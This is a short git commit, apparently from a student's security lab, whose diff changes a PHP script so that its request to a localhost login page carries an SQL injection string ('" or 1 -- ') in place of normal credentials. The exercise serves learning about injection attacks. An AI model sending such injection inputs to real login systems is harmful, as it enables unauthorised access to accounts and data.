288908be9c514bae97191654cc2705ada7b0583e
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-09 16:54:13 +0200

    a

--- script.php
+++ script.php
@@ -1,5 +1,5 @@
 <?php
-   $url="http://localhost/lab09/login.php?u=toto&p=tata";
+   $url="http://localhost/lab09/login.php?u=\" or 1 -- ";
    $result = file_get_contents($url);
 
    print($result);
